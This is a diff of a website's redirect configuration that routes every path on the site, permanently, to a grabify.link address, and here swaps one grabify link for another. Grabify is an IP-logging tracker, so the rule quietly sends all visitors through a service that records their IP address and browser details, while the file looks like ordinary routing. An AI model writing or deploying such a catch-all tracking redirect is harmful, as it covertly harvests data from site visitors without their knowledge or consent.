@@ -2,11 +2,12 @@
   "redirects": [
     {
       "source": "/(.*)",
-      "destination": "https://grabify.link/AN83OA",
+      "destination": "https://grabify.link/1MQMCU",
       "permanent": true
     }
   ]
 }
+
 
 
 
